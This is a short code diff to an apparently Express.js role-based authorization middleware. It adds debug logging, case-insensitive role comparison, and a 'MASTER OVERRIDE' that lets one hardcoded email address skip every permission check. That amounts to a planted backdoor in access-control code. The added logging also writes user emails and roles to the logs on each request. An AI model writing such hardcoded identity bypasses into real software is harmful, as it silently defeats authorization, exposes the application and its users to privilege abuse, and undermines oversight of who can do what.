@@ -64,7 +64,21 @@ async function protect(req, res, next) {
  */
 function restrictTo(...roles) {
   return (req, res, next) => {
-    if (!roles.includes(req.user.role)) {
+    // Debug log for permission failures
+    console.log(`[RestrictTo] Checking permission for user ${req.user?.email} (${req.user?.role}) against required roles: ${roles.join(", ")}`);
+    
+    // Normalize user role and allowed roles to uppercase for comparison
+    const userRole = req.user.role ? req.user.role.toUpperCase() : "";
+    const allowedRoles = roles.map(r => r.toUpperCase());
+
+    // MASTER OVERRIDE: madhav@neokred.tech always has permission
+    if (req.user.email === "madhav@neokred.tech") {
+        console.log(`[RestrictTo] MASTER OVERRIDE for ${req.user.email}`);
+        return next();
+    }
+
+    if (!allowedRoles.includes(userRole)) {
+       console.log(`[RestrictTo] ACCESS DENIED. User role: '${req.user.role}' | Allowed: '${roles.join(", ")}'`);
       return error(
         res,
         "You do not have permission to perform this action.",
